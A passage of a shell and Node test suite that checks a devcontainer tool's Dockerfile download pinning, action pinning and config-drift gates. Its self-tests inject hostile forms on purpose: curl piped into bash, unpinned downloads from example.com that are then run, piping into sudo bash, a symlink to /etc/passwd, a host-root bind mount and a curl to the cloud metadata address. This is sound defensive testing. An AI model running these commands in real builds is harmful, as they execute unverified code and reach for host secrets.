          at(new RegExp('^for (\\w+) in \\$' + keys + '$')),
          at(new RegExp('^do case ",\\$' + allowed + '," in \\*",\\$\\w+,"\\*\\)$')),
          at(/^\*\) echo .* >&2$/),
          at(/^exit 1$/),
          at(/^done$/),
        ];
        if (steps.some((s, i) => s < 0 || (i && s <= steps[i - 1]))) {
          problems.push(`${entry.name}: keys are not all checked against ${allowed} before the keyring is used`);
        }
      }
    });
  }

  for (const p of PINNED) if (!found.has(p.name)) problems.push(`${p.name}: expected pinned download not found`);
  for (const name of args.keys()) {
    if (/_SHA256(?:_|$)|_FINGERPRINTS$/.test(name) && !scripts.some(s => refersTo(s, name))) problems.push(`ARG ${name} is not used`);
  }
  for (const name of ['NODE_RELEASE_KEYS_COMMIT']) {
    if (!/^[0-9a-f]{40}$/.test(arg(name))) problems.push(`ARG ${name} is not a pinned commit`);
  }

  // zsh theme and plugins: fetched at a pinned commit that is on the upstream
  // branch named by the renovate comment.
  const gitScripts = scripts.filter(s => gitCmd('fetch').test(s));
  for (const script of gitScripts) {
    for (const url of script.match(/https:\/\/[^\s"']+/g) || []) {
      if (!GIT_PINS.some(([repo]) => repo === url)) problems.push(`git source is not commit-pinned: ${url}`);
    }
    if (!/rev-parse HEAD\)"?\s*=\s*"\$/.test(script)) problems.push('git fetch step does not verify the checked-out commit');
    if (!/\bmerge-base --is-ancestor\b/.test(script) || !/refs\/heads\//.test(script)) {
      problems.push('git fetch step does not check that the commit is on the upstream branch');
    }
  }
  for (const [repo, name] of GIT_PINS) {
    const a = args.get(name) || { value: '' };
    if (!/^[0-9a-f]{40}$/.test(a.value)) problems.push(`ARG ${name} is not a pinned commit`);
    const r = a.renovate || {};
    if (r.datasource !== 'git-refs' || r.depName !== repo || !r.branch) {
      problems.push(`ARG ${name} has no "# renovate: datasource=git-refs depName=${repo} branch=..." comment`);
      continue;
    }
    const call = gitScripts.some(s => statements(s).some(st =>
      st.text.includes(repo) && refersTo(st.text, name) && st.text.endsWith(' ' + r.branch)));
    if (!call) problems.push(`${repo} is not fetched at ARG ${name} on its ${r.branch} branch`);
  }
  // oh-my-zsh comes from the digest-pinned base image; never fetch it as a fallback.
  if (!gitScripts.some(s => statements(s).some(st => /^test -f \S*\/\.oh-my-zsh\/oh-my-zsh\.sh$/.test(st.text)))) {
    problems.push('build does not fail when the base image lacks oh-my-zsh');
  }
  return problems;
}

// Each case changes the real Dockerfile: a bypass must be reported, an
// equivalent safe form must pass.
const SELF_TESTS = [
  ['`|| true` after a checksum', '| sha256sum -c -;', '| sha256sum -c - || true;', 'uses ||'],
  ['set +e around a checksum', /(echo "\$sha256  \$tmp\/git-delta\.deb" \| sha256sum -c -;)/, 'set +e; $1 set -e;', 'turns off errexit'],
  ['set +o errexit', /RUN set -eu; \\\n(\s+tmp=\$\(mktemp -d\); \\\n\s+curl[^\n]*claude\.ai)/, 'RUN set -eu; set +o errexit; \\\n$1', 'turns off errexit'],
  ['&& after a checksum', /(echo "\$sha256  \$tmp\/git-delta\.deb" \| sha256sum -c -);/, '$1 &&', 'git-delta: the first use'],
  ['checksum inside if', /(echo "\$sha256  \$tmp\/git-delta\.deb" \| sha256sum -c -);/, 'if $1; then :; fi;', 'git-delta: the first use'],
  ['checksum negated', /(echo "\$sha256  \$tmp\/git-delta\.deb" \| sha256sum -c -);/, '! $1;', 'git-delta: the first use'],
  ['checksum removed', /\s+echo "\$sha256  \$tmp\/git-delta\.deb" \| sha256sum -c -; \\\n/, '\n', 'git-delta: the first use'],
  ['checksum of a hardcoded value', /echo "\$sha256  (\$tmp\/fzf\.tar\.gz)"/, 'x=0000; echo "$x  $1"', 'does not come from its *_SHA256 ARGs'],
  ['heredoc script with an unpinned download', '# uv (Python package manager)\n',
    "RUN <<'SH'\nset -eu\ncurl -fsSL --proto '=https' --tlsv1.2 -o /tmp/x https://example.com/x.sh\nbash /tmp/x\nSH\n# uv (Python package manager)\n", 'has no pin'],
  ['heredoc script without set -eu', '# uv (Python package manager)\n',
    "RUN <<'SH'\ntmp=$(mktemp -d)\ncurl -fsSL --proto '=https' --tlsv1.2 -o \"$tmp/i\" https://opencode.ai/install\nbash \"$tmp/i\"\nSH\n# uv (Python package manager)\n", 'does not start with "set -eu;"'],
  ['curl piped into tar', /curl (-fsSL --proto '=https' --tlsv1\.2) -o "\$tmp\/fzf\.tar\.gz" \\\n\s+("[^"]+");/, 'curl $1 $2 | tar -xz -C "$tmp";', 'plain command'],
  ['curl piped into sh', /curl (-fsSL --proto '=https' --tlsv1\.2) -o "\$tmp\/install\.sh" (https:\/\/claude\.ai\/install\.sh);/, 'curl $1 $2 | bash;', 'pipes into a shell'],
  ['download in command substitution', /bash "\$tmp\/install" --no-modify-path;/, 'sh -c "$(curl -fsSL https://opencode.ai/install)";', 'command substitution'],
  ['unknown download', '# uv (Python package manager)\n', "RUN set -eu; curl -fsSL --proto '=https' --tlsv1.2 -o /tmp/x https://example.com/t.tgz; tar -xzf /tmp/x\n# uv (Python package manager)\n", 'has no pin'],
  ['curl without --proto', /curl -fsSL --proto '=https' (--tlsv1\.2 -o "\$tmp\/install\.sh" https:\/\/claude)/, 'curl -fsSL $1', 'without --proto'],
  ['curl without -f', /curl -fsSL (--proto '=https' --tlsv1\.2 -o "\$tmp\/docker\.asc")/, 'curl -sSL $1', 'curl without -f'],
  ['download step without set -eu', /RUN set -eu; \\\n(\s+arch="\$TARGETARCH"; \\\n\s+case "\$arch" in \\\n\s+amd64\) fnm_asset)/, 'RUN true; \\\n$1', 'does not start with "set -eu;"'],
  ['sha256 ARG emptied', /ARG FNM_SHA256_ARM64=[0-9a-f]+/, 'ARG FNM_SHA256_ARM64=', 'ARG FNM_SHA256_ARM64 is not a pinned sha256'],
  ['architecture default does not fail', /\*\) echo "unsupported architecture: \$arch" >&2; exit 1 ;;( \\\n\s+esac; \\\n\s+tmp=\$\(mktemp -d\); \\\n\s+curl[^\n]*fzf)/, '*) sha256="$FZF_SHA256_AMD64" ;;$1', 'fzf: per-architecture'],
  ['unused sha256 ARG', 'ARG FZF_VERSION=', 'ARG STALE_SHA256=0683067a4cbbcc19b9fd2841253131d1b37ccfa724725098d811d4d0d9fcc25b\nARG FZF_VERSION=', 'ARG STALE_SHA256 is not used'],
  ['TARGETARCH undeclared', /\nARG TARGETARCH\n/, '\n', 'ARG TARGETARCH is not declared'],
  ['wget', '# uv (Python package manager)\n', 'RUN set -eu; wget -O /tmp/x https://example.com/x\n# uv (Python package manager)\n', 'uses wget'],
  ['ADD of a URL', '# uv (Python package manager)\n', 'ADD https://example.com/tool /usr/local/bin/tool\n# uv (Python package manager)\n', 'ADD fetches a URL'],
  ['pipe into sudo bash', '# uv (Python package manager)\n', 'RUN set -eu; cat /tmp/x | sudo -E bash\n# uv (Python package manager)\n', 'pipes into a shell'],
  ['Node SHASUMS not verified', /gpgv --keyring "\$tmp\/node-release-keys\.kbx" --output "(\$tmp\/node-shasums\.verified)" "\$tmp\/SHASUMS256\.txt\.asc";/, 'cp "$tmp/SHASUMS256.txt.asc" "$1";', 'Node SHASUMS256: the first use'],
  ['Node SHASUMS parsed unverified', /(node_entry=\$\(grep -E "[^"]+") "\$tmp\/node-shasums\.verified"\)/, '$1 "$tmp/SHASUMS256.txt.asc")', 'is read after gpgv'],
  ['Node checksum not from the signed text', /node_sha256="\$\{node_entry%%  \*\}";/, 'node_sha256="$NODE_MIN_VERSION";', 'does not come from gpgv-verified text'],
  ['Node keyring not checked', /\s+echo "\$NODE_RELEASE_KEYS_SHA256  \$tmp\/node-release-keys\.kbx" \| sha256sum -c -; \\\n/, '\n', 'Node release keyring: the first use'],
  ['Node rollback guard removed', /if ! printf '%s\\n' "\$NODE_MIN_VERSION" "\$node_version" \| sort -C -V; then \\\n[^\n]*\n\s+fi; \\\n/, '', 'no rollback guard'],
  ['apt key fingerprints not checked', /(keys=\$\(gpg --batch --show-keys[^\n]*\\\n[^\n]*\n)\s+test -n "\$keys"; \\\n\s+for key in \$keys; do \\\n\s+case ",\$GH_KEYRING_FINGERPRINTS," in \\\n[^\n]*\n[^\n]*\n\s+esac; \\\n\s+done; \\\n/, '$1', 'GitHub CLI apt key: keys are not all checked'],
  ['apt key fingerprint malformed', /ARG DOCKER_KEYRING_FINGERPRINTS=\S+/, 'ARG DOCKER_KEYRING_FINGERPRINTS=8D81803C0EBFCD88', 'not a list of key fingerprints'],
  ['commit pin is a tag', /ARG POWERLEVEL10K_COMMIT=[0-9a-f]+/, 'ARG POWERLEVEL10K_COMMIT=v1.20.0', 'ARG POWERLEVEL10K_COMMIT is not a pinned commit'],
  ['git clone', /fetch_commit (https:\/\/github\.com\/zsh-users\/zsh-syntax-highlighting) \\\n[^\n]*master/, 'git clone $1 "$custom/plugins/zsh-syntax-highlighting"', 'clones a git repository'],
  ['unpinned git source', 'custom=/home/vscode/.oh-my-zsh/custom; \\\n', 'custom=/home/vscode/.oh-my-zsh/custom; \\\n    fetch_commit https://github.com/example/plugin "$ZSH_AUTOSUGGESTIONS_COMMIT" "$custom/plugins/x" master; \\\n', 'git source is not commit-pinned'],
  ['commit not verified', /\s+test "\$\(git -C "\$3" rev-parse HEAD\)" = "\$2"; \\\n/, '\n', 'does not verify the checked-out commit'],
  ['no upstream ancestry check', /\s+if ! git -C "\$upstream" merge-base --is-ancestor "\$2" FETCH_HEAD; then \\\n[^\n]*\n\s+fi; \\\n/, '\n', 'is on the upstream branch'],
  ['branch differs from the renovate comment', /("\$ZSH_AUTOSUGGESTIONS_COMMIT" "\$custom\/plugins\/zsh-autosuggestions") master/, '$1 develop', 'is not fetched at ARG ZSH_AUTOSUGGESTIONS_COMMIT'],
  ['oh-my-zsh guard removed', /\s+test -f \/home\/vscode\/\.oh-my-zsh\/oh-my-zsh\.sh; \\\n/, '\n', 'lacks oh-my-zsh'],
  // Equivalent forms that must stay accepted.
  ['set -eux is accepted', /RUN set -eu;/g, 'RUN set -eux;', null],
  ['set -euo pipefail is accepted', /RUN set -eu;/g, 'RUN set -euo pipefail;', null],
  ['RUN --mount flags are accepted', /RUN set -eu;/g, 'RUN --mount=type=cache,target=/var/cache/apt,sharing=locked set -eu;', null],
  ['a heredoc script is accepted', '# uv (Python package manager)\n',
    "RUN <<'SH'\nset -eu\ntmp=$(mktemp -d)\ncurl -fsSL --proto '=https' --tlsv1.2 -o \"$tmp/i\" https://opencode.ai/install\nbash \"$tmp/i\" --no-modify-path\nSH\n# uv (Python package manager)\n", null],
];

function selfTest(source) {
  const failures = [];
  const base = check(source);
  if (base.length) failures.push('the unchanged Dockerfile does not pass:\n  ' + base.join('\n  '));
  for (const [name, from, to, expect] of SELF_TESTS) {
    const changed = typeof from === 'string' ? source.replace(from, () => to) : source.replace(from, to);
    if (changed === source) { failures.push(`${name}: the change no longer applies to the Dockerfile`); continue; }
    const problems = check(changed);
    if (expect === null && problems.length) failures.push(`${name}: rejected:\n  ` + problems.join('\n  '));
    if (expect !== null && !problems.some(p => p.includes(expect))) {
      failures.push(`${name}: not reported (wanted "${expect}"); got:\n  ` + (problems.join('\n  ') || '(nothing)'));
    }
  }
  return failures;
}

const source = fs.readFileSync(process.argv[2], 'utf8');
const result = process.argv[3] === '--self-test' ? selfTest(source) : check(source);
if (result.length) {
  console.log(result.join('\n'));
  process.exit(1);
}
NODE
if ! out=$(node "$TMP/check-dockerfile-downloads.js" "$ROOT/template/Dockerfile" 2>&1); then
  fail "template/Dockerfile download integrity:
$out"
fi
if ! out=$(node "$TMP/check-dockerfile-downloads.js" "$ROOT/template/Dockerfile" --self-test 2>&1); then
  fail "template/Dockerfile download-integrity self-test:
$out"
fi
# The smoke suite exists once, in smoke.yml. Both tracks must call it after
# their build job and must not carry a copy of it.
smoke_workflow="$ROOT/.github/workflows/smoke.yml"
[ -f "$smoke_workflow" ] || fail "smoke.yml is missing"
grep -Fq 'FAIL: shell startup ran vscode-writable code' "$smoke_workflow" \
  || fail "smoke.yml lost the shell-startup plant smoke"
grep -Fq 'OK: managed zsh loads powerlevel10k, both plugins, node, fnm, fzf, and delta' "$smoke_workflow" \
  || fail "smoke.yml lost the pinned zsh theme/plugins/tools smoke"
grep -Fq '"$GITHUB_WORKSPACE/aic" init --build --force' "$smoke_workflow" \
  || fail "workflow pre-created override is not passed through explicit init --force"
grep -Fq 'CODEX_NON_INTERACTIVE=1' "$smoke_workflow" \
  || fail "workflow does not exercise the supported unattended Codex refresh"
grep -Fq 'https://chatgpt.com/codex/install.sh' "$smoke_workflow" \
  || fail "workflow does not exercise the official Codex installer"
grep -Fq 'codex update' "$smoke_workflow" \
  && fail "workflow regressed to installation-method-dependent codex update"
[ "$(grep -cE '^  [A-Za-z0-9_-]+:[[:space:]]*$' "$smoke_workflow")" -ge 1 ] \
  || fail "smoke.yml defines no job"
grep -Eq '^  workflow_call:[[:space:]]*$' "$smoke_workflow" \
  || fail "smoke.yml is not a reusable workflow"
awk '/^on:/ { on = 1; next } /^[^[:space:]#]/ { on = 0 } on && /^  [A-Za-z_]+:/ { print $1 }' \
  "$smoke_workflow" | grep -vx 'workflow_call:' | grep -q . \
  && fail "smoke.yml has a trigger besides workflow_call"
grep -Eq '^    needs:' "$smoke_workflow" \
  && fail "smoke.yml job names a needs: the caller owns"
for workflow in "$ROOT/.github/workflows/rebuild.yml" \
  "$ROOT/.github/workflows/release.yml"; do
  block=$(awk '/^  smoke:[[:space:]]*$/ { on = 1; print; next } on && /^  [A-Za-z0-9_-]+:/ { exit } on && NF { print }' "$workflow")
  [ "$block" = "  smoke:
    needs: build
    uses: ./.github/workflows/smoke.yml" ] \
    || fail "$(basename "$workflow") smoke job is not the thin call to smoke.yml"
done
grep -Fq '.github/workflows/smoke.yml' <(awk '/^  pull_request:/,/^  workflow_dispatch:/' "$ROOT/.github/workflows/rebuild.yml") \
  || fail "rebuild.yml pull_request paths omit smoke.yml"
grep -Fq '.github/workflows/smoke.yml' <(awk '/^  push:/,/^  pull_request:/' "$ROOT/.github/workflows/rebuild.yml") \
  || fail "rebuild.yml push paths omit smoke.yml"
# Publish jobs hold the npm OIDC token and GHCR package write. A tag ref lets
# whoever moves the upstream tag run code there, so every action is pinned to
# a full commit SHA, with the version as a comment for Renovate.
action_pins=0
for workflow in "$ROOT"/.github/workflows/*.yml; do
  while IFS= read -r line; do
    [ -n "$line" ] || continue
    action_pins=$((action_pins + 1))
    printf '%s\n' "$line" \
      | grep -Eq '^[[:space:]]*(- )?uses: [A-Za-z0-9_.-]+/[A-Za-z0-9_./-]+@[0-9a-f]{40} # v[0-9]+(\.[0-9]+)*$' \
      || fail "$(basename "$workflow") uses an action that is not pinned to a commit SHA: $line"
  done <<EOF
$(grep -E '^[[:space:]]*(- )?uses:' "$workflow" | grep -Ev 'uses: \./' || true)
EOF
done
[ "$action_pins" -gt 0 ] || fail "action-pin check found no workflow actions"
grep -Fq '"helpers:pinGitHubActionDigests"' "$ROOT/renovate.json" \
  || fail "Renovate does not keep GitHub Action digests pinned"
grep -Fq '"CODEX_NON_INTERACTIVE": "1"' "$ROOT/template/post-create.py" \
  || fail "runtime Codex refresh is not noninteractive"
grep -Fq 'CODEX_INSTALLER_URL = "https://chatgpt.com/codex/install.sh"' \
  "$ROOT/template/post-create.py" \
  || fail "runtime Codex refresh does not use the official standalone installer"
grep -Fq '["codex", "update"]' "$ROOT/template/post-create.py" \
  && fail "runtime Codex refresh regressed to installation-method detection"

# The local release gate runs with pipefail. A direct `git show | grep -q`
# falsely fails once a large changelog keeps writing after grep finds an early
# matching heading (git receives SIGPIPE). Exercise the real hook with a fake
# producer large enough to reproduce that failure, while retaining the absent-
# section rejection.
prepush_bin="$TMP/prepush-bin"
mkdir -p "$prepush_bin"
cat > "$prepush_bin/git" <<'SH'
#!/bin/sh
[ "${1:-}" = show ] || exit 2
printf '%s\n' '# Changelog' '' '## [0.6.0] - 2026-07-13'
awk 'BEGIN { for (i = 0; i < 20000; i++) print "- release-note-padding-release-note-padding-release-note-padding" }'
SH
chmod +x "$prepush_bin/git"
printf '%s\n' \
  'refs/tags/v0.6.0 1111111111111111111111111111111111111111 refs/tags/v0.6.0 0000000000000000000000000000000000000000' \
  | PATH="$prepush_bin:$PATH" "$ROOT/.githooks/pre-push" \
  || fail "pre-push changelog gate rejected an early match after producer SIGPIPE"
if printf '%s\n' \
  'refs/tags/v0.6.1 1111111111111111111111111111111111111111 refs/tags/v0.6.1 0000000000000000000000000000000000000000' \
  | PATH="$prepush_bin:$PATH" "$ROOT/.githooks/pre-push" >/dev/null 2>&1; then
  fail "pre-push changelog gate accepted a missing version section"
fi
grep -Fqx 'x-aic-runtime-user: &aic-runtime-user "${AIC_RUNTIME_USER:-1000:1000}"' \
  "$TMP/one/api/.devcontainer/docker-compose.yml" \
  || fail "generated Compose embedded a host-specific runtime identity"
grep -q '^AIC_DOCKER_SOCKET=/' "$TMP/one/api/.devcontainer/.env" \
  || fail "init did not generate the local Docker socket environment"
grep -q '^AIC_RUNTIME_USER=[0-9][0-9]*:[0-9][0-9]*$' "$TMP/one/api/.devcontainer/.env" \
  || fail "init did not generate the runtime uid/gid environment"
grep -q '^AIC_STATUS_RELAY=0$' "$TMP/one/api/.devcontainer/.env" \
  || fail "agent status relay did not default off"
grep -q '^AIC_STATUS_PROJECT=api$' "$TMP/one/api/.devcontainer/.env" \
  || fail "agent status relay omitted the path-free project label"
grep -q "^AIC_STATUS_PROJECT_ID=$name1$" "$TMP/one/api/.devcontainer/.env" \
  || fail "agent status relay omitted the path-unique project identity"
grep -q '^\.env$' "$TMP/one/api/.devcontainer/.gitignore" \
  || fail "host-specific Compose environment is not gitignored"
for key in CONTAINERS EVENTS IMAGES INFO NETWORKS VOLUMES POST BUILD; do
  grep -qE "^[[:space:]]*$key:[[:space:]]*0[[:space:]]*$" \
    "$TMP/one/api/.devcontainer/docker-compose.yml" \
    || fail "fresh init did not default Docker $key to off"
done
for key in VERSION PING; do
  grep -qE "^[[:space:]]*$key:[[:space:]]*1[[:space:]]*$" \
    "$TMP/one/api/.devcontainer/docker-compose.yml" \
    || fail "fresh init removed minimal Docker $key endpoint"
done
out=$(cd "$TMP/one/api" && AIC_HOME="$ROOT" "$ROOT/aic" check-drift 2>&1)
echo "$out" | grep -Eq 'managed devcontainer validation failed|requests extra host access' \
  && fail "clean pull-mode project did not pass resolved-config validation"
out=$(cd "$TMP/one/api" && AIC_HOME="$ROOT" "$ROOT/aic" validate 2>&1)
echo "$out" | grep -q 'configuration valid' \
  || fail "validate did not accept a clean resolved configuration"

# Only an exact global host marker can enable the callback; repository state
# cannot supply the bit, endpoint, or project identity.
relay_home="$TMP/relay-home"
mkdir -p "$relay_home/.config/aicontainer" "$TMP/relay-project"
printf 'enabled\n' > "$relay_home/.config/aicontainer/status-relay"
git -C "$TMP/relay-project" init -q
# XDG_CONFIG_HOME must not move the marker: the Compose seed mount and
# prepare_host_seed_paths() both hardcode $HOME/.config/aicontainer, so an
# XDG-derived root would read a directory nothing else in aic ever uses.
(cd "$TMP/relay-project" && HOME="$relay_home" XDG_CONFIG_HOME="$TMP/decoy-config" \
  AIC_HOME="$ROOT" "$ROOT/aic" init --with codex --shell zsh >/dev/null)
relay_name=$(sed -n 's/^name:[[:space:]]*//p' \
  "$TMP/relay-project/.devcontainer/docker-compose.yml")
grep -q '^AIC_STATUS_RELAY=1$' "$TMP/relay-project/.devcontainer/.env" \
  || fail "exact host status-relay marker did not enable the relay"
grep -q "^AIC_STATUS_PROJECT_ID=$relay_name$" \
  "$TMP/relay-project/.devcontainer/.env" \
  || fail "enabled relay did not retain its managed project identity"
out=$(cd "$TMP/relay-project" && HOME="$relay_home" \
  AIC_HOME="$ROOT" "$ROOT/aic" status 2>&1)
echo "$out" | grep -q 'relay:    enabled (host.docker.internal:8787)' \
  || fail "status did not report the enabled agent status relay"
# A marker alone changes nothing until the generated .env is rewritten and the
# container recreated. The diagnostic must say that instead of reporting a
# relay the project is not running.
sed -i.bak 's/^AIC_STATUS_RELAY=1$/AIC_STATUS_RELAY=0/' \
  "$TMP/relay-project/.devcontainer/.env"
rm -f "$TMP/relay-project/.devcontainer/.env.bak"
out=$(cd "$TMP/relay-project" && HOME="$relay_home" \
  AIC_HOME="$ROOT" "$ROOT/aic" status 2>&1)
echo "$out" | grep -q 'relay:    enabled on host; pending aic rebuild' \
  || fail "status claimed a relay the project has not applied yet"
(cd "$TMP/relay-project" && HOME="$relay_home" AIC_HOME="$ROOT" \
  "$ROOT/aic" sync >/dev/null)
grep -q '^AIC_STATUS_RELAY=1$' "$TMP/relay-project/.devcontainer/.env" \
  || fail "sync did not re-apply the host status-relay mode"

cat > "$TMP/relay-project/.devcontainer/docker-compose.override.yml" <<'YAML'
services:
  devcontainer:
    environment:
      AIC_STATUS_RELAY: "0"
YAML
(cd "$TMP/relay-project" && HOME="$relay_home" AIC_HOME="$ROOT" \
  "$ROOT/aic" sync >/dev/null)
out=$(cd "$TMP/relay-project" && HOME="$relay_home" \
  AIC_HOME="$ROOT" "$ROOT/aic" check-drift 2>&1)
echo "$out" | grep -q 'environment AIC_STATUS_RELAY overrides a managed startup or isolation boundary' \
  || fail "repository override silently changed the host-owned status relay mode"

# A refused marker must be rejected before apply_template touches anything.
# The managed copy is wholesale, so a late failure would leave devcontainer.json
# reset to the pristine template with the project's AIC_TOOLS/AIC_SHELL lost.
bad_relay_home="$TMP/bad-relay-home"
mkdir -p "$bad_relay_home/.config/aicontainer"
printf enabled > "$bad_relay_home/.config/aicontainer/status-relay"
before_sync=$(cat "$TMP/one/api/.devcontainer/devcontainer.json")
if (cd "$TMP/one/api" && HOME="$bad_relay_home" AIC_HOME="$ROOT" \
    "$ROOT/aic" sync >/dev/null 2>&1); then
  fail "status relay accepted a malformed host marker"
fi
[ "$before_sync" = "$(cat "$TMP/one/api/.devcontainer/devcontainer.json")" ] \
  || fail "refused status-relay marker left a half-applied managed template"
rm "$bad_relay_home/.config/aicontainer/status-relay"
ln -s /etc/passwd "$bad_relay_home/.config/aicontainer/status-relay"
if (cd "$TMP/one/api" && HOME="$bad_relay_home" AIC_HOME="$ROOT" \
    "$ROOT/aic" sync >/dev/null 2>&1); then
  fail "status relay accepted a symlinked host marker"
fi
[ "$before_sync" = "$(cat "$TMP/one/api/.devcontainer/devcontainer.json")" ] \
  || fail "symlinked status-relay marker left a half-applied managed template"
# Diagnostics must not disagree with the mutating commands: a marker that makes
# init/sync/up refuse is a blocker, so doctor has to name it and exit nonzero.
set +e
out=$(cd "$TMP/one/api" && HOME="$bad_relay_home" AIC_HOME="$ROOT" \
  "$ROOT/aic" doctor 2>&1)
doctor_relay_rc=$?
set -e
echo "$out" | grep -q 'host status-relay marker is invalid' \
  || fail "doctor reported ready for a marker every mutating command refuses"
[ "$doctor_relay_rc" -ne 0 ] || fail "doctor exited zero on a status-relay blocker"

# The copied guide and ignore file are managed security/UX artifacts too: the
# former tells an in-container agent which paths it must not edit, while the
# latter keeps host-specific runtime state out of Git.
printf '\nmalicious drift\n' >> "$TMP/one/api/.devcontainer/README.md"
printf '\n!.env\n' >> "$TMP/one/api/.devcontainer/.gitignore"
out=$(cd "$TMP/one/api" && AIC_HOME="$ROOT" "$ROOT/aic" check-drift 2>&1)
echo "$out" | grep -q '.devcontainer/README.md differs from the managed template' \
  || fail "managed project guide drift was not rejected"
echo "$out" | grep -q '.devcontainer/.gitignore differs from the managed template' \
  || fail "managed runtime-ignore drift was not rejected"
(cd "$TMP/one/api" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null)
out=$(cd "$TMP/one/api" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" "$ROOT/aic" status 2>&1)
echo "$out" | grep -q "project:  $name1" || fail "status omitted the path-unique project identity"
echo "$out" | grep -q 'mode:     pull; tools: codex; shell: zsh' \
  || fail "status omitted the configured mode/tools/shell"
echo "$out" | grep -q 'Docker:   none (ping/version only)' \
  || fail "status misreported the default Docker exposure"
echo "$out" | grep -q 'relay:    disabled' \
  || fail "status misreported the default agent status relay mode"
echo "$out" | grep -q "image:    pinned v$version (matches CLI)" \
  || fail "status omitted image/CLI drift state"
echo "$out" | grep -q 'auth:     credential bridge ' \
  || fail "status omitted credential-bridge health"
echo "$out" | grep -q 'volumes:  auth ' || fail "status omitted auth/session volume state"

# Doctor remains useful even when a prerequisite is broken: it completes every
# read-only check and reports a summary instead of aborting on the first one.
set +e
out=$(cd "$TMP/one/api" && AIC_HOME="$ROOT" "$ROOT/aic" doctor 2>&1)
doctor_rc=$?
set -e
[ "$doctor_rc" -le 1 ] || fail "doctor returned an unexpected status: $doctor_rc"
echo "$out" | grep -q '^aic doctor$' || fail "doctor command did not run"
echo "$out" | grep -q 'Node.js' || fail "doctor omitted the Node.js prerequisite"
echo "$out" | grep -q 'Docker Compose' || fail "doctor omitted the Compose prerequisite"
echo "$out" | grep -q 'managed project identity matches this canonical path' \
  || fail "doctor omitted managed path/project wiring"
echo "$out" | grep -q '^Result:' || fail "doctor omitted its actionable summary"

new_project "$TMP/clean-build"
(cd "$TMP/clean-build" && AIC_HOME="$ROOT" "$ROOT/aic" sync --build >/dev/null)
out=$(cd "$TMP/clean-build" && AIC_HOME="$ROOT" "$ROOT/aic" check-drift 2>&1)
echo "$out" | grep -Eq 'managed devcontainer validation failed|requests extra host access' \
  && fail "clean build-mode project did not pass resolved-config validation"

# The structural validator is a file of the install (lib/validate-cli.mjs). A
# validator that cannot run prints no findings, so aic must fail closed and not
# read the empty output as "no findings".
new_project "$TMP/validator-missing"
(cd "$TMP/validator-missing" && AIC_HOME="$ROOT" "$ROOT/aic" validate >/dev/null 2>&1) \
  || fail "a clean project did not pass aic validate"
broken_home="$TMP/broken-aic-home"
mkdir -p "$broken_home"
cp "$ROOT/aic" "$ROOT/package.json" "$broken_home/"
cp -R "$ROOT/template" "$broken_home/template"
# The other helpers in lib/ fail closed too (lib/cli.mjs, see
# tests/test-aic-host-helpers.mjs), so an install without lib/ also refuses.
(cd "$TMP/validator-missing" && AIC_HOME="$broken_home" "$broken_home/aic" validate >/dev/null 2>&1) \
  && fail "aic validate passed without its lib/ modules"
cp -R "$ROOT/lib" "$broken_home/lib"
rm -f "$broken_home/lib/validate-cli.mjs"
out=$(cd "$TMP/validator-missing" && AIC_HOME="$broken_home" "$broken_home/aic" validate 2>&1) \
  && fail "aic validate passed without its validator module"
echo "$out" | grep -q 'aic validator (lib/validate-cli.mjs) failed to run' \
  || fail "a missing validator module was not a MANAGED finding"
mkdir -p "$broken_home/lib"
printf 'process.exit(3);\n' > "$broken_home/lib/validate-cli.mjs"
out=$(cd "$TMP/validator-missing" && AIC_HOME="$broken_home" "$broken_home/aic" validate 2>&1) \
  && fail "aic validate passed when its validator exited non-zero"
echo "$out" | grep -q 'aic validator (lib/validate-cli.mjs) failed to run' \
  || fail "a failing validator was not a MANAGED finding"

# Values normalized only to account for installation/project paths must first
# be proven to point at this exact checkout. Otherwise a tracked managed file
# could hide a host bind, shared volume/network alias, or root build context
# behind the normalizer and bypass the override gate entirely.
sed -E 's|^([[:space:]]*)context: \.$|\1context: ..|' \
  "$TMP/clean-build/.devcontainer/docker-compose.yml" \
  > "$TMP/clean-build/.devcontainer/docker-compose.yml.tmp"
mv "$TMP/clean-build/.devcontainer/docker-compose.yml.tmp" \
  "$TMP/clean-build/.devcontainer/docker-compose.yml"
out=$(cd "$TMP/clean-build" && AIC_HOME="$ROOT" "$ROOT/aic" check-drift 2>&1)
echo "$out" | grep -q 'build context escaped .devcontainer' \
  || fail "managed build-context normalization hid a root build context"
(cd "$TMP/clean-build" && AIC_HOME="$ROOT" "$ROOT/aic" sync --build >/dev/null)

new_project "$TMP/managed-aliases"
sed -E 's|^([[:space:]]*)- \.\.:/workspace:cached$|\1- /:/workspace:cached|' \
  "$TMP/managed-aliases/.devcontainer/docker-compose.yml" \
  > "$TMP/managed-aliases/.devcontainer/docker-compose.yml.tmp"
mv "$TMP/managed-aliases/.devcontainer/docker-compose.yml.tmp" \
  "$TMP/managed-aliases/.devcontainer/docker-compose.yml"
out=$(cd "$TMP/managed-aliases" && AIC_HOME="$ROOT" "$ROOT/aic" check-drift 2>&1)
echo "$out" | grep -q 'managed mount source for /workspace escaped this project' \
  || fail "managed mount normalization hid a host-root workspace bind"
(cd "$TMP/managed-aliases" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null)

awk '{ print; if ($0 ~ /^[[:space:]]*aic-sessions:[[:space:]]*$/) print "    name: aic-auth-global" }' \
  "$TMP/managed-aliases/.devcontainer/docker-compose.yml" \
  > "$TMP/managed-aliases/.devcontainer/docker-compose.yml.tmp"
mv "$TMP/managed-aliases/.devcontainer/docker-compose.yml.tmp" \
  "$TMP/managed-aliases/.devcontainer/docker-compose.yml"
out=$(cd "$TMP/managed-aliases" && AIC_HOME="$ROOT" "$ROOT/aic" check-drift 2>&1)
echo "$out" | grep -q 'managed volume aic-sessions must remain project-scoped' \
  || fail "managed volume normalization hid a global-auth alias"
(cd "$TMP/managed-aliases" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null)

printf '\nnetworks:\n  default:\n    name: aic-auth-network\n' \
  >> "$TMP/managed-aliases/.devcontainer/docker-compose.yml"
out=$(cd "$TMP/managed-aliases" && AIC_HOME="$ROOT" "$ROOT/aic" check-drift 2>&1)
echo "$out" | grep -q 'managed network default must remain project-scoped' \
  || fail "managed network normalization hid a shared network alias"

# Devcontainer-only features/lifecycle hooks can execute before post-create
# installs metadata/network policy, and Compose command/health changes can do
# the same. They are control plane, not harmless editor customization.
new_project "$TMP/precreate-exec"
sed 's|^  "customizations": {|  "features": {"ghcr.io/example/untrusted:1": {}},\
  "onCreateCommand": "curl http://169.254.169.254/",\
  "customizations": {|' \
